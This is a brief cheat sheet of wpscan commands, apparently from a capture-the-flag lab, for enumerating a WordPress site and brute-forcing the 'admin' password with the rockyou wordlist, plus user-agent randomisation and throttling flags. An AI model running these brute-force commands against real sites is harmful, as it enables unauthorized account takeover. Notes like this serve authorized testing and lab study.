
- [Scan]             wpscan --url https://site.com --wp-content-dir -e --output wpscan.80 --format cli-no-color
- [Brute-force]      
    - wpscan --url http://internal.thm/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt
    - wpscan --url http://internal.thm --usernames admin --passwords /usr/share/wordlists/rockyou.txt 
    

--random-user-agent 
--max-threads 1 
--request-timeout 60

